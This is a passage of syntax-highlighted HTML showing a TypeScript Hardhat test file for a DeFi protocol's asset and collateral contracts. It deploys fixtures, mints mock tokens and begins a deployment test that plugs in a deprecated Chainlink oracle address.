class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">ATokenFiatCollateral</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">CTokenFiatCollateral</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">CTokenMock</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">ERC20Mock</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">FiatCollateral</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">IAssetRegistry</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">RTokenAsset</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">StaticATokenMock</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">TestIBackingManager</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">TestIRToken</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">USDCMock</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">} </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&#39;../../typechain&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">Collateral</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">defaultFixture</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">} </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&#39;../fixtures&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">createFixtureLoader</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">waffle</span><span class=\"mtk1\">.</span><span class=\"mtk12\">createFixtureLoader</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">describe</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;Assets contracts #fast&#39;</span><span class=\"mtk1\">, () </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// Tokens</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rsr</span><span class=\"mtk1\">: </span><span class=\"mtk10\">ERC20Mock</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">compToken</span><span class=\"mtk1\">: </span><span class=\"mtk10\">ERC20Mock</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">aaveToken</span><span class=\"mtk1\">: </span><span class=\"mtk10\">ERC20Mock</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rToken</span><span class=\"mtk1\">: </span><span class=\"mtk10\">TestIRToken</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">: </span><span class=\"mtk10\">ERC20Mock</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">usdc</span><span class=\"mtk1\">: </span><span class=\"mtk10\">USDCMock</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">aToken</span><span class=\"mtk1\">: </span><span class=\"mtk10\">StaticATokenMock</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">cToken</span><span class=\"mtk1\">: </span><span class=\"mtk10\">CTokenMock</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// Assets</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collateral0</span><span class=\"mtk1\">: </span><span class=\"mtk10\">FiatCollateral</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collateral1</span><span class=\"mtk1\">: </span><span class=\"mtk10\">FiatCollateral</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collateral2</span><span class=\"mtk1\">: </span><span class=\"mtk10\">ATokenFiatCollateral</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collateral3</span><span class=\"mtk1\">: </span><span class=\"mtk10\">CTokenFiatCollateral</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// Assets</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rsrAsset</span><span class=\"mtk1\">: </span><span class=\"mtk10\">Asset</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">compAsset</span><span class=\"mtk1\">: </span><span class=\"mtk10\">Asset</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">aaveAsset</span><span class=\"mtk1\">: </span><span class=\"mtk10\">Asset</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rTokenAsset</span><span class=\"mtk1\">: </span><span class=\"mtk10\">RTokenAsset</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">basket</span><span class=\"mtk1\">: </span><span class=\"mtk10\">Collateral</span><span class=\"mtk1\">[]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// Config</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">config</span><span class=\"mtk1\">: </span><span class=\"mtk10\">IConfig</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// Main</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">loadFixture</span><span class=\"mtk1\">: </span><span class=\"mtk10\">ReturnType</span><span class=\"mtk1\">&lt;</span><span class=\"mtk4\">typeof</span><span class=\"mtk1\"> </span><span class=\"mtk10\">createFixtureLoader</span><span class=\"mtk1\">&gt;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">wallet</span><span class=\"mtk1\">: </span><span class=\"mtk10\">Wallet</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">assetRegistry</span><span class=\"mtk1\">: </span><span class=\"mtk10\">IAssetRegistry</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">backingManager</span><span class=\"mtk1\">: </span><span class=\"mtk10\">TestIBackingManager</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// Factory</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">AssetFactory</span><span class=\"mtk1\">: </span><span class=\"mtk10\">ContractFactory</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">RTokenAssetFactory</span><span class=\"mtk1\">: </span><span class=\"mtk10\">ContractFactory</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amt</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">fp</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;1e4&#39;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">before</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;create fixture loader&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> () </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ;[</span><span class=\"mtk12\">wallet</span><span class=\"mtk1\">] = (</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getSigners</span><span class=\"mtk1\">()) </span><span class=\"mtk15\">as</span><span class=\"mtk1\"> </span><span class=\"mtk10\">unknown</span><span class=\"mtk1\"> </span><span class=\"mtk15\">as</span><span class=\"mtk1\"> </span><span class=\"mtk10\">Wallet</span><span class=\"mtk1\">[]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">loadFixture</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">createFixtureLoader</span><span class=\"mtk1\">([</span><span class=\"mtk12\">wallet</span><span class=\"mtk1\">])</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  })</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">beforeEach</span><span class=\"mtk1\">(</span><span class=\"mtk4\">async</span><span class=\"mtk1\"> () </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Deploy fixture</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ;({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">rsr</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">rsrAsset</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">compToken</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">compAsset</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">aaveToken</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">aaveAsset</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">basket</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">assetRegistry</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">backingManager</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">config</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">rToken</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">rTokenAsset</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    } = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">loadFixture</span><span class=\"mtk1\">(</span><span class=\"mtk12\">defaultFixture</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Get collateral tokens</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">collateral0</span><span class=\"mtk1\"> = &lt;</span><span class=\"mtk10\">FiatCollateral</span><span class=\"mtk1\">&gt;</span><span class=\"mtk12\">basket</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">collateral1</span><span class=\"mtk1\"> = &lt;</span><span class=\"mtk10\">FiatCollateral</span><span class=\"mtk1\">&gt;</span><span class=\"mtk12\">basket</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">collateral2</span><span class=\"mtk1\"> = &lt;</span><span class=\"mtk10\">ATokenFiatCollateral</span><span class=\"mtk1\">&gt;</span><span class=\"mtk12\">basket</span><span class=\"mtk1\">[</span><span class=\"mtk7\">2</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">collateral3</span><span class=\"mtk1\"> = &lt;</span><span class=\"mtk10\">CTokenFiatCollateral</span><span class=\"mtk1\">&gt;</span><span class=\"mtk12\">basket</span><span class=\"mtk1\">[</span><span class=\"mtk7\">3</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">token</span><span class=\"mtk1\"> = &lt;</span><span class=\"mtk10\">ERC20Mock</span><span class=\"mtk1\">&gt;</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getContractAt</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;ERC20Mock&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collateral0</span><span class=\"mtk1\">.</span><span class=\"mtk11\">erc20</span><span class=\"mtk1\">())</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">usdc</span><span class=\"mtk1\"> = &lt;</span><span class=\"mtk10\">USDCMock</span><span class=\"mtk1\">&gt;</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getContractAt</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;USDCMock&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collateral1</span><span class=\"mtk1\">.</span><span class=\"mtk11\">erc20</span><span class=\"mtk1\">())</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">aToken</span><span class=\"mtk1\"> = &lt;</span><span class=\"mtk10\">StaticATokenMock</span><span class=\"mtk1\">&gt;(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getContractAt</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;StaticATokenMock&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collateral2</span><span class=\"mtk1\">.</span><span class=\"mtk11\">erc20</span><span class=\"mtk1\">())</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">cToken</span><span class=\"mtk1\"> = &lt;</span><span class=\"mtk10\">CTokenMock</span><span class=\"mtk1\">&gt;</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getContractAt</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;CTokenMock&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collateral3</span><span class=\"mtk1\">.</span><span class=\"mtk11\">erc20</span><span class=\"mtk1\">())</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rsr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">wallet</span><span class=\"mtk1\">).</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">wallet</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amt</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">compToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">wallet</span><span class=\"mtk1\">).</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">wallet</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amt</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">aaveToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">wallet</span><span class=\"mtk1\">).</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">wallet</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amt</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Issue RToken to enable RToken.price</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">basket</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tok</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getContractAt</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;ERC20Mock&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">basket</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk11\">erc20</span><span class=\"mtk1\">())</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tok</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">wallet</span><span class=\"mtk1\">).</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">wallet</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amt</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tok</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">wallet</span><span class=\"mtk1\">).</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amt</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">wallet</span><span class=\"mtk1\">)[</span><span class=\"mtk8\">&#39;issue(uint256)&#39;</span><span class=\"mtk1\">](</span><span class=\"mtk12\">amt</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">AssetFactory</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getContractFactory</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;Asset&#39;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">RTokenAssetFactory</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getContractFactory</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;RTokenAsset&#39;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  })</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">describe</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;Deployment&#39;</span><span class=\"mtk1\">, () </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">it</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;Deployment should setup assets correctly&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> () </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk12\">network</span><span class=\"mtk1\">.</span><span class=\"mtk12\">config</span><span class=\"mtk1\">.</span><span class=\"mtk12\">chainId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// let validOracle = &#39;0x443C5116CdF663Eb387e72C688D276e702135C87&#39;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">deprecatedOracle</span><span class=\"mtk1\"> = </span><span class=\"mtk8\">&#39;0x2E5B04aDC0A3b7dB5Fd34AE817c7D0993315A8a6&#39;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">priceTimeout_</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">aaveAsset</span><span class=\"mtk1\">.</span><span class=\"mtk11\">priceTimeout</span><span class=\"mtk1\">(),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         </span><span class=\"mtk12\">chainlinkFeed_</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">deprecatedOracle</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         </span><span class=\"mtk12\">oracleError_</span><span 